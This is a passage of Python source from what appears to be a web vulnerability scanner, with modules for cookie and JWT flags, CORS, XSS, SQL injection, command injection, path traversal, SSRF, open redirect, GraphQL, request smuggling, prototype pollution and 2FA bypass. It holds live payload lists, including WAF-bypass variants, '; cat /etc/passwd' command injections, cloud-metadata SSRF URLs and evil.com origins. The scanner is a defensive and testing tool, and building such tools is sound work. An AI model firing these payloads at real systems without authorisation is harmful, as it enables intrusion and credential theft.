                self._log(f"{hdr}: {val[:70]}", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 07 — COOKIES + JWT
    # ══════════════════════════════════════════════════════════════════════════

    def check_cookies(self):
        self._section("07 · Cookie Security & JWT Analysis")
        resp = self.http.get(self.target)
        if resp is None:
            return

        if not resp.cookies:
            self._log("No cookies set by target", "INFO")
            return

        for cookie in resp.cookies:
            issues = []
            if not cookie.secure:
                issues.append("Missing Secure flag")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("Missing HttpOnly flag")
            ss = cookie.get_nonstandard_attr("SameSite") or ""
            if not ss:
                issues.append("SameSite not set")
            elif ss.lower() == "none" and not cookie.secure:
                issues.append("SameSite=None requires Secure flag")

            if issues:
                sev = "HIGH" if "Missing Secure flag" in issues else "MEDIUM"
                self._finding(sev, "Cookies",
                              f"Insecure cookie: {cookie.name}",
                              "Insecure cookie flags expose session tokens.",
                              " | ".join(issues),
                              "Set: Secure; HttpOnly; SameSite=Strict",
                              cwe="CWE-614", cvss=6.1)
            else:
                self._log(f"Cookie '{cookie.name}': flags OK", "OK")

            if self._is_jwt(cookie.value):
                self._analyze_jwt(cookie.value, f"Cookie '{cookie.name}'")

    def _is_jwt(self, v: str) -> bool:
        p = v.split(".")
        return len(p) == 3 and all(len(x) > 0 for x in p)

    def _b64d(self, s: str) -> str:
        s += "=" * (-len(s) % 4)
        try:
            return base64.urlsafe_b64decode(s).decode("utf-8", errors="replace")
        except Exception:
            return ""

    def _analyze_jwt(self, token: str, src: str):
        parts = token.split(".")
        try:
            hdr = json.loads(self._b64d(parts[0]))
            pay = json.loads(self._b64d(parts[1]))
        except Exception:
            return

        alg = hdr.get("alg","")
        if alg.lower() == "none":
            self._finding("CRITICAL","JWT","JWT alg=none (signature bypass)",
                          "Authentication bypass possible.",
                          f"Source: {src}  alg=none",
                          "Reject JWTs with alg=none.",
                          cwe="CWE-347", cvss=9.8)
        elif alg.upper().startswith("HS"):
            self._finding("MEDIUM","JWT",f"JWT uses symmetric alg ({alg})",
                          "Vulnerable to brute-force if secret is weak.",
                          f"Source: {src}",
                          "Use RS256/ES256 asymmetric algorithms.",
                          cwe="CWE-327", cvss=5.9)

        kid = hdr.get("kid","")
        if kid and any(c in kid for c in ["'",'"'," ","--",";"]):
            self._finding("CRITICAL","JWT","JWT kid header injection",
                          "kid may be used in SQL/path query.",
                          f"kid: {kid}",
                          "Validate and sanitize the kid field.",
                          cwe="CWE-89", cvss=9.1)

        if "exp" not in pay:
            self._finding("HIGH","JWT","JWT missing exp claim",
                          "Token never expires.",
                          f"Source: {src}",
                          "Add a short-lived exp claim.",
                          cwe="CWE-613", cvss=7.5)
        elif pay["exp"] < time.time():
            self._finding("HIGH","JWT","Expired JWT may still be accepted",
                          "If server doesn't validate exp, expired tokens grant access.",
                          f"exp: {pay['exp']}",
                          "Strictly validate exp server-side.",
                          cwe="CWE-613", cvss=8.1)

        for priv in ["admin","role","is_admin","superuser","permissions"]:
            if priv in pay:
                self._finding("INFO","JWT",f"JWT privilege claim: '{priv}'",
                              "Client-controlled privilege claims are dangerous if signature is weak.",
                              f"{priv}: {pay[priv]}",
                              "Never trust client-supplied privilege claims.")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 08 — CORS
    # ══════════════════════════════════════════════════════════════════════════

    def check_cors(self):
        self._section("08 · CORS Misconfiguration")

        origins = [
            ("https://evil.com",              "Arbitrary external origin"),
            ("null",                           "Null origin (file:// / sandboxed iframe)"),
            (f"https://{self.host}.evil.com",  "Target hostname as subdomain prefix"),
            (f"https://evil.{self.host}",      "Target as suffix of attacker domain"),
            (f"https://x{self.host}",          "Attacker domain prefixed with target host"),
            (f"http://{self.host}",            "HTTP downgrade of same host"),
        ]

        found_issues = 0

        # Test both GET requests and OPTIONS preflight (real-world CORS uses OPTIONS)
        for origin, desc in origins:
            for method, resp in [
                ("GET",     self.http.get(self.target,
                                headers={"Origin": origin}, allow_redirects=True)),
                ("OPTIONS", self.http.options(self.target,
                                headers={
                                    "Origin": origin,
                                    "Access-Control-Request-Method":  "GET",
                                    "Access-Control-Request-Headers": "Authorization",
                                })),
            ]:
                if resp is None:
                    continue

                acao = resp.headers.get("Access-Control-Allow-Origin",  "").strip()
                acac = resp.headers.get("Access-Control-Allow-Credentials","").strip()
                acam = resp.headers.get("Access-Control-Allow-Methods", "").strip()
                acah = resp.headers.get("Access-Control-Allow-Headers", "").strip()

                # Check 1: origin directly reflected
                origin_reflected = (acao == origin)
                # Check 2: wildcard (only dangerous with credentials)
                wildcard = (acao == "*")
                # Check 3: null origin accepted
                null_accepted = (origin == "null" and acao == "null")

                if origin_reflected or null_accepted:
                    creds_exposed = acac.lower() == "true"
                    sev  = "CRITICAL" if creds_exposed else "HIGH"
                    cvss = 9.1 if creds_exposed else 7.5
                    self._finding(
                        sev, "CORS",
                        f"CORS misconfiguration [{method}] — {desc}",
                        "Attacker-controlled origin is trusted. "
                        "Cross-site data theft / account takeover possible.",
                        (f"Origin sent:   {origin}\n"
                         f"ACAO returned: {acao}\n"
                         f"Credentials:   {acac}\n"
                         f"Methods:       {acam}\n"
                         f"Headers:       {acah}"),
                        "Implement an explicit origin allowlist. "
                        "Never reflect arbitrary Origin headers. "
                        "Never combine Allow-Credentials:true with wildcard/reflected origins.",
                        cwe="CWE-942", cvss=cvss
                    )
                    found_issues += 1
                    break  # one finding per origin is enough

                elif wildcard and acac.lower() == "true":
                    # Wildcard + credentials is invalid per spec but some servers do it
                    self._finding(
                        "CRITICAL", "CORS",
                        f"CORS wildcard + credentials [{method}]",
                        "Access-Control-Allow-Origin: * combined with credentials=true "
                        "violates the spec and may allow cross-site attacks on some browsers.",
                        f"ACAO: *  ACAC: {acac}",
                        "Remove the wildcard. Use an explicit allowlist instead.",
                        cwe="CWE-942", cvss=9.1
                    )
                    found_issues += 1
                    break

        # Report clearly even when nothing found
        if found_issues == 0:
            self._log(
                f"Tested {len(origins)} origins × GET+OPTIONS — "
                "no CORS misconfiguration found", "OK"
            )
        else:
            self._log(f"CORS: {found_issues} misconfiguration(s) found", "WARN")

    # ══════════════════════════════════════════════════════════════════════════
    # INJECTION HELPERS (GET + POST, with WAF bypass)
    # ══════════════════════════════════════════════════════════════════════════

    def _get_xss_payloads(self) -> List[Tuple[str,str]]:
        normal = [
            ('<script>alert("XSS")</script>',         "basic"),
            ('"><script>alert(1)</script>',            "attr-break"),
            ('<img src=x onerror=alert(1)>',           "img-onerror"),
            ('<svg/onload=alert(1)>',                  "svg-onload"),
            ('<details open ontoggle=alert(1)>',       "html5"),
            ('javascript:alert(1)',                    "js-uri"),
            ('"-alert(1)-"',                          "js-string"),
        ]
        bypass = [
            ('%3Cscript%3Ealert(1)%3C%2Fscript%3E',   "url-encoded"),
            ('<scr\x00ipt>alert(1)</scr\x00ipt>',      "null-byte"),
            ('<ScRiPt>alert(1)</ScRiPt>',              "mixed-case"),
            ('<<script>script>alert(1)<</script>/script>', "double-tag"),
            ('<svg><script>alert(1)</script></svg>',   "svg-script"),
            ('<body onload=alert(1)>',                 "body-onload"),
            ('"><iframe src="javascript:alert(1)">',   "iframe-js"),
        ]
        return bypass + normal if self._waf_bypass else normal + bypass

    def _get_sqli_error_payloads(self) -> List[str]:
        normal = ["'",'"',"\\","';--",'";--',"' OR '1'='1","' OR 1=1--"]
        bypass = [
            "' /*!OR*/ '1'='1",    "'/**/OR/**/1=1--",
            "' %4fR '1'='1",       "'%20OR%201=1--",
            "1' /*!50000 AND*/ '1'='1", "1'/**/AND/**/'1'='1",
        ]
        return bypass + normal if self._waf_bypass else normal + bypass

    def _get_sqli_time_payloads(self) -> List[Tuple[str,str,float]]:
        normal = [
            ("MySQL",      "' AND SLEEP(4)--",               4.0),
            ("MSSQL",      "'; WAITFOR DELAY '0:0:4'--",     4.0),
            ("PostgreSQL", "'; SELECT pg_sleep(4)--",        4.0),
        ]
        bypass = [
            ("MySQL",      "'/**/AND/**/SLEEP(4)--",         4.0),
            ("MySQL",      "' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--", 4.0),
            ("MSSQL",      "';WAITFOR%20DELAY%20'0:0:4'--",  4.0),
        ]
        return bypass + normal if self._waf_bypass else normal + bypass

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 09 — XSS (GET + POST)
    # ══════════════════════════════════════════════════════════════════════════

    XSS_ERRORS = ["alert(", "onerror=", "onload=", "<script", "javascript:"]

    def check_xss(self):
        self._section("09 · Cross-Site Scripting — GET & POST")
        payloads  = self._get_xss_payloads()
        found     = set()
        count     = 0

        # ── GET parameters
        for url, params in self._param_urls[:self.args.max_urls]:
            for param in params:
                key = f"GET::{url}::{param}"
                if key in found or count >= self.args.max_tests:
                    break
                for payload, desc in payloads:
                    test_url = self._inject_get(url, params, param, payload)
                    resp     = self.http.get(test_url)
                    count   += 1
                    if resp and not self._is_false_positive(url, resp):
                        if payload in resp.text or any(
                            e in resp.text for e in self.XSS_ERRORS
                            if e in payload
                        ):
                            found.add(key)
                            self._finding("HIGH","XSS",
                                f"Reflected XSS (GET) — param: {param}",
                                f"Input reflected unsanitized. Vector: {desc}",
                                f"Payload: {payload}\nURL: {test_url[:150]}",
                                "HTML-encode all output. Enforce strict CSP.",
                                url=test_url, cwe="CWE-79", cvss=7.2, method="GET")
                            break

        # ── POST forms
        for page_url, form in self._forms[:self.args.max_urls]:
            for field_name in form.fields:
                key = f"POST::{form.action}::{field_name}"
                if key in found or count >= self.args.max_tests:
                    break
                for payload, desc in payloads:
                    data = {**form.fields, field_name: payload}
                    resp = self.http.post(form.action, data=data)
                    count += 1
                    if resp and payload in resp.text:
                        found.add(key)
                        self._finding("HIGH","XSS",
                            f"Reflected XSS (POST) — field: {field_name}",
                            f"POST form input reflected unsanitized. Vector: {desc}",
                            f"Payload: {payload}\nForm: {form.action}",
                            "HTML-encode all output. Enforce strict CSP.",
                            url=form.action, cwe="CWE-79", cvss=7.2, method="POST")
                        break

        self._log(f"XSS: {count} tests, {len(found)} issue(s)", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 10 — SQL INJECTION (GET + POST)
    # ══════════════════════════════════════════════════════════════════════════

    SQLI_DB_ERRORS = [
        "you have an error in your sql syntax","warning: mysql_","mysql_fetch",
        "microsoft ole db provider for sql server","odbc sql server driver",
        "unclosed quotation mark","[microsoft][odbc",
        "ora-00907","ora-00933","ora-01756",
        "pg_query():","pg::syntaxerror",
        "sqlite_","sqlite3.","sqliteexception",
        "syntax error near","dynamic sql error","sql command not properly ended",
    ]

    SQLI_BOOL_PAIRS = [
        ("1 AND 1=1","1 AND 1=2"),
        ("1' AND '1'='1","1' AND '1'='2"),
        ('1" AND "1"="1','1" AND "1"="2'),
    ]

    def check_sqli(self):
        self._section("10 · SQL Injection — GET & POST")
        error_payloads = self._get_sqli_error_payloads()
        time_payloads  = self._get_sqli_time_payloads()
        found = set()
        count = 0

        def _test_error(url_or_action, data_or_params, param, method="GET"):
            nonlocal count
            for payload in error_payloads:
                if method == "GET":
                    test_url = self._inject_get(url_or_action, data_or_params, param, payload)
                    resp     = self.http.get(test_url)
                else:
                    d    = {**data_or_params, param: payload}
                    resp = self.http.post(url_or_action, data=d)
                    test_url = url_or_action
                count += 1
                if resp:
                    body_l = resp.text.lower()
                    match  = next((e for e in self.SQLI_DB_ERRORS if e in body_l), None)
                    if match:
                        return payload, match, test_url
            return None

        def _test_time(url_or_action, data_or_params, param, method="GET"):
            nonlocal count
            for db, payload, threshold in time_payloads:
                if method == "GET":
                    test_url = self._inject_get(url_or_action, data_or_params, param, payload)
                    start = time.time()
                    resp  = self.http.get(test_url)
                else:
                    d    = {**data_or_params, param: payload}
                    start = time.time()
                    resp  = self.http.post(url_or_action, data=d)
                    test_url = url_or_action
                elapsed = time.time() - start
                count  += 1
                if resp and elapsed >= threshold:
                    return db, payload, elapsed, test_url
            return None

        def _test_bool(url_or_action, data_or_params, param, method="GET"):
            nonlocal count
            for tp, fp in self.SQLI_BOOL_PAIRS:
                if method == "GET":
                    r_t = self.http.get(self._inject_get(url_or_action, data_or_params, param, tp))
                    r_f = self.http.get(self._inject_get(url_or_action, data_or_params, param, fp))
                else:
                    r_t = self.http.post(url_or_action, data={**data_or_params, param: tp})
                    r_f = self.http.post(url_or_action, data={**data_or_params, param: fp})
                count += 2
                if r_t and r_f:
                    diff = abs(len(r_t.text) - len(r_f.text))
                    if diff > 80:
                        return tp, fp, diff
            return None

        # GET params
        for url, params in self._param_urls[:self.args.max_urls]:
            for param in params:
                key = f"GET::{url}::{param}"
                if key in found or count >= self.args.max_tests:
                    break

                r = _test_error(url, params, param, "GET")
                if r:
                    found.add(key)
                    self._finding("CRITICAL","SQLi",
                        f"SQLi Error-based (GET) — param: {param}",
                        "Database error returned — direct injection confirmed.",
                        f"Payload: {r[0]}\nError: {r[1]}\nURL: {r[2][:130]}",
                        "Use parameterized queries.",
                        url=r[2], cwe="CWE-89", cvss=9.8, method="GET")
                    continue

                rb = _test_bool(url, params, param, "GET")
                if rb:
                    found.add(key)
                    self._finding("CRITICAL","SQLi",
                        f"SQLi Boolean-blind (GET) — param: {param}",
                        f"Response differs by {rb[2]} bytes between true/false.",
                        f"True: {rb[0]}\nFalse: {rb[1]}\nDiff: {rb[2]} bytes",
                        "Use parameterized queries.",
                        url=url, cwe="CWE-89", cvss=9.1, method="GET")
                    continue

                rt = _test_time(url, params, param, "GET")
                if rt:
                    found.add(key)
                    self._finding("CRITICAL","SQLi",
                        f"SQLi Time-based ({rt[0]}, GET) — param: {param}",
                        f"Delayed {rt[2]:.1f}s — blind injection confirmed.",
                        f"Payload: {rt[1]}\nDelay: {rt[2]:.2f}s",
                        "Use parameterized queries.",
                        url=rt[3], cwe="CWE-89", cvss=9.8, method="GET")

        # POST forms
        for _, form in self._forms[:self.args.max_urls]:
            for field_name, field_val in form.fields.items():
                key = f"POST::{form.action}::{field_name}"
                if key in found or count >= self.args.max_tests:
                    break

                r = _test_error(form.action, form.fields, field_name, "POST")
                if r:
                    found.add(key)
                    self._finding("CRITICAL","SQLi",
                        f"SQLi Error-based (POST) — field: {field_name}",
                        "Database error returned from POST form.",
                        f"Payload: {r[0]}\nError: {r[1]}\nForm: {form.action}",
                        "Use parameterized queries.",
                        url=form.action, cwe="CWE-89", cvss=9.8, method="POST")
                    continue

                rt = _test_time(form.action, form.fields, field_name, "POST")
                if rt:
                    found.add(key)
                    self._finding("CRITICAL","SQLi",
                        f"SQLi Time-based ({rt[0]}, POST) — field: {field_name}",
                        f"POST form delayed {rt[2]:.1f}s.",
                        f"Payload: {rt[1]}\nDelay: {rt[2]:.2f}s",
                        "Use parameterized queries.",
                        url=rt[3], cwe="CWE-89", cvss=9.8, method="POST")

        self._log(f"SQLi: {count} tests, {len(found)} issue(s)", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 11 — COMMAND INJECTION (GET + POST)
    # ══════════════════════════════════════════════════════════════════════════

    CMD_TIME_PL  = ["; sleep 4","| sleep 4","&& sleep 4","`sleep 4`","$(sleep 4)",
                    "& ping -n 4 127.0.0.1 &","; ping -c 4 127.0.0.1"]
    CMD_OUT_PL   = ["; id","| id","&& id","`id`","$(id)","; whoami","| whoami",
                    "; cat /etc/passwd","| cat /etc/passwd"]
    CMD_OUT_SIGS = [r"uid=\d+\(\w+\)", r"root:.*:0:0:", r"daemon:.*:/usr/sbin"]

    def check_command_injection(self):
        self._section("11 · OS Command Injection — GET & POST")
        found = set()
        count = 0

        def _test_output(url_or_action, data_or_params, param, method):
            nonlocal count
            for payload in self.CMD_OUT_PL:
                if method == "GET":
                    resp = self.http.get(self._inject_get(
                        url_or_action, data_or_params, param, payload))
                else:
                    resp = self.http.post(url_or_action,
                                         data={**data_or_params, param: payload})
                count += 1
                if resp:
                    for sig in self.CMD_OUT_SIGS:
                        if re.search(sig, resp.text):
                            return payload, sig
            return None

        def _test_time(url_or_action, data_or_params, param, method):
            nonlocal count
            for payload in self.CMD_TIME_PL:
                if method == "GET":
                    start = time.time()
                    resp  = self.http.get(self._inject_get(
                        url_or_action, data_or_params, param, payload))
                else:
                    start = time.time()
                    resp  = self.http.post(url_or_action,
                                          data={**data_or_params, param: payload})
                count += 1
                if resp and (time.time() - start) >= 3.5:
                    return payload, time.time() - start
            return None

        for url, params in self._param_urls[:self.args.max_urls]:
            for param in params:
                key = f"GET::{url}::{param}"
                if key in found or count >= self.args.max_tests:
                    break
                r = _test_output(url, params, param, "GET")
                if r:
                    found.add(key)
                    self._finding("CRITICAL","CMDi",
                        f"Command Injection (GET) — param: {param}",
                        "Server command output reflected.",
                        f"Payload: {r[0]}\nMatch: {r[1]}",
                        "Never pass user input to shell commands.",
                        url=url, cwe="CWE-78", cvss=10.0, method="GET")
                    continue
                rt = _test_time(url, params, param, "GET")
                if rt:
                    found.add(key)
                    self._finding("CRITICAL","CMDi",
                        f"Command Injection time-based (GET) — param: {param}",
                        f"Delayed {rt[1]:.1f}s.",
                        f"Payload: {rt[0]}",
                        "Never pass user input to shell commands.",
                        url=url, cwe="CWE-78", cvss=10.0, method="GET")

        for _, form in self._forms[:self.args.max_urls]:
            for field_name in form.fields:
                key = f"POST::{form.action}::{field_name}"
                if key in found or count >= self.args.max_tests:
                    break
                r = _test_output(form.action, form.fields, field_name, "POST")
                if r:
                    found.add(key)
                    self._finding("CRITICAL","CMDi",
                        f"Command Injection (POST) — field: {field_name}",
                        "Server command output in POST response.",
                        f"Payload: {r[0]}\nMatch: {r[1]}",
                        "Never pass user input to shell commands.",
                        url=form.action, cwe="CWE-78", cvss=10.0, method="POST")

        self._log(f"CMDi: {count} tests, {len(found)} issue(s)", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 12 — PATH TRAVERSAL (GET + POST)
    # ══════════════════════════════════════════════════════════════════════════

    TRAV_PL = [
        "../../../../etc/passwd","../../../../etc/shadow",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "../../../../windows/win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
    ]
    TRAV_SIGS = ["root:x:0:","root:!:","[extensions]","[boot loader]","daemon:x:"]

    def check_path_traversal(self):
        self._section("12 · Path Traversal — GET & POST")
        found = set()
        count = 0

        for url, params in self._param_urls[:self.args.max_urls]:
            for param in params:
                key = f"GET::{url}::{param}"
                if key in found or count >= self.args.max_tests:
                    break
                for payload in self.TRAV_PL:
                    resp = self.http.get(self._inject_get(url, params, param, payload))
                    count += 1
                    if resp:
                        sig = next((s for s in self.TRAV_SIGS if s in resp.text), None)
                        if sig:
                            found.add(key)
                            self._finding("CRITICAL","Traversal",
                                f"Path Traversal (GET) — param: {param}",
                                "Local file content returned.",
                                f"Payload: {payload}\nSignature: {sig}",
                                "Validate paths against a whitelist.",
                                url=url, cwe="CWE-22", cvss=9.1, method="GET")
                            break

        for _, form in self._forms[:self.args.max_urls]:
            for field_name in form.fields:
                key = f"POST::{form.action}::{field_name}"
                if key in found or count >= self.args.max_tests:
                    break
                for payload in self.TRAV_PL:
                    resp = self.http.post(form.action,
                                         data={**form.fields, field_name: payload})
                    count += 1
                    if resp:
                        sig = next((s for s in self.TRAV_SIGS if s in resp.text), None)
                        if sig:
                            found.add(key)
                            self._finding("CRITICAL","Traversal",
                                f"Path Traversal (POST) — field: {field_name}",
                                "Local file content in POST response.",
                                f"Payload: {payload}\nSignature: {sig}",
                                "Validate paths against a whitelist.",
                                url=form.action, cwe="CWE-22", cvss=9.1, method="POST")
                            break

        self._log(f"Traversal: {count} tests, {len(found)} issue(s)", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 13 — SSRF
    # ══════════════════════════════════════════════════════════════════════════

    SSRF_PARAM_NAMES = {
        "url","uri","link","src","source","dest","destination","redirect",
        "path","endpoint","callback","fetch","proxy","image","img","load",
        "open","import","forward","to","next","return","continue","ref",
        "href","target","feed","resource","page","host","webhook","service",
    }
    SSRF_PAYLOADS = [
        ("AWS metadata",      "http://169.254.169.254/latest/meta-data/"),
        ("GCP metadata",      "http://metadata.google.internal/computeMetadata/v1/"),
        ("Azure metadata",    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Localhost",         "http://127.0.0.1/"),
        ("IPv6 localhost",    "http://[::1]/"),
        ("File read",         "file:///etc/passwd"),
    ]
    SSRF_SIGS = ["ami-id","instance-id","local-ipv4","iam/security-credentials",
                 "project-id","root:x:","daemon:x:","computemetadata"]

    def check_ssrf(self):
        self._section("13 · SSRF Detection")
        found = set()
        count = 0

        for url, params in self._param_urls[:self.args.max_urls]:
            for param in params:
                if param.lower() not in self.SSRF_PARAM_NAMES:
                    continue
                key = f"{url}::{param}"
                if key in found:
                    continue
                for desc, payload in self.SSRF_PAYLOADS:
                    resp = self.http.get(self._inject_get(url, params, param, payload))
                    count += 1
                    if resp and resp.status_code == 200:
                        sig = next((s for s in self.SSRF_SIGS
                                    if s in resp.text.lower()), None)
                        if sig:
                            found.add(key)
                            self._finding("CRITICAL","SSRF",
                                f"SSRF — param: {param} ({desc})",
                                "Server fetched internal/metadata URL.",
                                f"Payload: {payload}\nSignature: {sig}",
                                "Block RFC-1918 ranges. Use URL allowlist.",
                                url=url, cwe="CWE-918", cvss=9.8)
                            break

        self._log(f"SSRF: {count} tests, {len(found)} issue(s)", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 14 — OPEN REDIRECT
    # ══════════════════════════════════════════════════════════════════════════

    REDIR_PARAMS = {
        "redirect","url","next","return","goto","target","redir",
        "destination","location","continue","to","from","ref",
        "returnUrl","returnTo","redirectUrl","forward","out",
    }

    def check_open_redirect(self):
        self._section("14 · Open Redirect")
        payloads = [
            "https://evil.com","//evil.com","/\\evil.com","\\evil.com",
            f"https://{self.host}@evil.com",f"https://evil.com%2F@{self.host}",
            "%0Ahttps://evil.com","/%09/evil.com",
        ]
        found = set()
        count = 0

        for url, params in self._param_urls[:self.args.max_urls]:
            for param in params:
                if param.lower() not in self.REDIR_PARAMS:
                    continue
                key = f"{url}::{param}"
                if key in found:
                    continue
                for payload in payloads:
                    test_url = self._inject_get(url, params, param, payload)
                    resp     = self.http.get(test_url, allow_redirects=False)
                    count   += 1
                    if resp and resp.status_code in (301,302,303,307,308):
                        loc = resp.headers.get("Location","")
                        if "evil.com" in loc and self.host not in loc.split("evil.com")[0]:
                            found.add(key)
                            self._finding("HIGH","OpenRedirect",
                                f"Open Redirect — param: {param}",
                                "Unvalidated redirect to external domain.",
                                f"Payload: {payload}\nLocation: {loc}",
                                "Validate redirect URLs against strict allowlist.",
                                url=test_url, cwe="CWE-601", cvss=6.1)
                            break

        self._log(f"Open Redirect: {count} tests, {len(found)} issue(s)", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 15 — GRAPHQL INTROSPECTION
    # ══════════════════════════════════════════════════════════════════════════

    GRAPHQL_ENDPOINTS = ["/graphql","/graphiql","/api/graphql","/gql","/_graphql","/__graphql"]

    INTROSPECTION_QUERY = json.dumps({
        "query": """
        {
          __schema {
            queryType { name }
            mutationType { name }
            types {
              name
              kind
              fields { name }
            }
          }
        }
        """
    })

    def check_graphql(self):
        self._section("15 · GraphQL Introspection")

        for path in self.GRAPHQL_ENDPOINTS:
            url  = self.target + path
            resp = self.http.post(
                url,
                json_data={"query": "{ __typename }"},
                headers={"Content-Type": "application/json"}
            )
            if resp is None or resp.status_code not in (200,400):
                continue

            if "data" in resp.text or "__typename" in resp.text:
                self._log(f"GraphQL endpoint found: {path}", "WARN")

                # Try introspection
                intro = self.http.post(
                    url,
                    data=self.INTROSPECTION_QUERY,
                    headers={"Content-Type": "application/json"}
                )
                if intro and "__schema" in intro.text:
                    try:
                        data   = intro.json()
                        types  = data.get("data",{}).get("__schema",{}).get("types",[])
                        names  = [t["name"] for t in types
                                  if t.get("name") and not t["name"].startswith("__")]
                        self._finding("HIGH","GraphQL",
                            "GraphQL introspection enabled",
                            "Full schema exposed — attacker can map all queries, mutations, and types.",
                            f"Endpoint: {url}\nTypes found: {', '.join(names[:10])}",
                            "Disable introspection in production. "
                            "Implement query depth and complexity limits.",
                            url=url, cwe="CWE-200", cvss=7.5)
                    except Exception:
                        self._finding("HIGH","GraphQL",
                            "GraphQL introspection enabled",
                            "Full schema accessible via introspection.",
                            f"Endpoint: {url}",
                            "Disable introspection in production.",
                            url=url, cwe="CWE-200", cvss=7.5)
                else:
                    self._finding("INFO","GraphQL",
                        "GraphQL endpoint found (introspection disabled)",
                        "Endpoint exists; introspection is disabled (good).",
                        f"Endpoint: {url}",
                        "Ensure query depth limits and authentication are in place.")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 16 — HTTP REQUEST SMUGGLING
    # ══════════════════════════════════════════════════════════════════════════

    def check_request_smuggling(self):
        self._section("16 · HTTP Request Smuggling (CL.TE / TE.CL)")

        # We use a timing-based detection heuristic
        # CL.TE: Send CL=6, body has chunked encoding
        # If the server hangs for > timeout, it may be buffering the smuggled request

        smuggle_headers_clte = {
            "Content-Length":  "6",
            "Transfer-Encoding": "chunked",
            "Connection":      "keep-alive",
        }
        smuggle_body_clte = "0\r\n\r\nG"   # G starts a smuggled GET

        smuggle_headers_tecl = {
            "Content-Length":  "3",
            "Transfer-Encoding": "chunked",
            "Connection":      "keep-alive",
            "Transfer-Encoding ": "x",  # Space obfuscation for TE.CL
        }
        smuggle_body_tecl = "1\r\nG\r\n0\r\n\r\n"

        smuggled = False
        for label, hdrs, body in [
            ("CL.TE", smuggle_headers_clte, smuggle_body_clte),
            ("TE.CL", smuggle_headers_tecl, smuggle_body_tecl),
        ]:
            start = time.time()
            try:
                resp = self.http.raw(
                    "POST", self.target,
                    headers=hdrs,
                    data=body,
                    timeout=5,
                    allow_redirects=False
                )
                elapsed = time.time() - start
                if elapsed >= 4.5:
                    self._finding("HIGH","Smuggling",
                        f"Potential HTTP Request Smuggling ({label})",
                        f"Server took {elapsed:.1f}s — may be buffering smuggled request. "
                        "Manual verification required.",
                        f"Technique: {label}\nBody: {repr(body)}\nDelay: {elapsed:.2f}s",
                        "Ensure front-end and back-end servers agree on body length parsing. "
                        "Disable TE support if not needed. Use HTTP/2.",
                        cwe="CWE-444", cvss=8.1)
                    smuggled = True
                    break
            except Exception:
                pass

        if not smuggled:
            self._log("No request smuggling indicators found", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 17 — PROTOTYPE POLLUTION
    # ══════════════════════════════════════════════════════════════════════════

    PP_PAYLOADS = [
        "__proto__[test]=polluted",
        "__proto__.test=polluted",
        "constructor[prototype][test]=polluted",
        "constructor.prototype.test=polluted",
    ]

    def check_prototype_pollution(self):
        self._section("17 · Prototype Pollution")
        found = set()
        count = 0

        # Test in query string
        for url, params in self._param_urls[:self.args.max_urls]:
            parsed = urllib.parse.urlparse(url)
            for payload in self.PP_PAYLOADS:
                # Inject into query string directly
                sep      = "&" if parsed.query else "?"
                test_url = url + sep + payload
                resp     = self.http.get(test_url)
                count   += 1
                if resp and "polluted" in resp.text:
                    key = url
                    if key not in found:
                        found.add(key)
                        self._finding("HIGH","ProtoPollution",
                            "Prototype Pollution via query string",
                            "Injected __proto__ property reflected in response.",
                            f"Payload: {payload}\nURL: {test_url[:150]}",
                            "Sanitize keys to block __proto__, constructor, prototype. "
                            "Use Object.create(null) for untrusted data.",
                            url=test_url, cwe="CWE-1321", cvss=7.3)
                        break

        # Test in POST body (JSON)
        for _, form in self._forms[:10]:
            for payload in self.PP_PAYLOADS:
                try:
                    key_parts = payload.split("=")
                    if "[" in key_parts[0]:
                        # nested
                        parts   = re.findall(r'\[([^\]]+)\]', key_parts[0])
                        obj     = {}
                        cur     = obj
                        for i, part in enumerate(parts[:-1]):
                            cur[part] = {}
                            cur       = cur[part]
                        cur[parts[-1]] = "polluted"
                    else:
                        obj = {}
                    resp = self.http.post(
                        form.action,
                        json_data=obj,
                        headers={"Content-Type": "application/json"}
                    )
                    count += 1
                    if resp and "polluted" in resp.text:
                        self._finding("HIGH","ProtoPollution",
                            "Prototype Pollution via JSON body",
                            "Injected __proto__ reflected in JSON response.",
                            f"Payload: {json.dumps(obj)}\nURL: {form.action}",
                            "Validate and sanitize all JSON keys recursively.",
                            url=form.action, cwe="CWE-1321", cvss=7.3, method="POST")
                        break
                except Exception:
                    pass

        self._log(f"Prototype Pollution: {count} tests, {len(found)} issue(s)", "OK")

    # ══════════════════════════════════════════════════════════════════════════
    # MODULE 18 — 2FA / OTP BYPASS HEURISTICS
    # ══════════════════════════════════════════════════════════════════════════

    def check_2fa_bypass(self):
        self._section("18 · 2FA / OTP Bypass Heuristics")
        found_forms = []

        for _, form in self._forms:
            # Look for OTP/2FA forms
            otp_fields = [f for f in form.fields
                          if re.search(r"otp|2fa|mfa|code|pin|token|verify",
                                       f, re.I)]
            if not otp_fields:
                continue
            found_forms.append((form, otp_fields))

        if not found_forms:
            self._log("No 2FA/OTP forms found", "INFO")
            return

        for form, otp_fields in found_forms:
            self._log(f"OTP/2FA form found: {form.action}", "WARN")

            for field in otp_fields:
                # Test 1: Empty OTP
                data = {**form.fields, field: ""}
                r    = self.http.post(form.action, data=data)
                if r and r.status_code == 200:
                    if not any(kw in r.text.lower() for kw in
                               ["invalid","error","incorrect","wrong","required"]):
                        self._finding("HIGH","2FA Bypass",
                            f"Possible 2FA bypass with empty OTP — field: {field}",
                            "Empty OTP submitted and server returned 200 without error.",
                            f"Form: {form.action}  Field: {field}",
                            "Validate OTP on every authentication attempt. Never allow empty.",
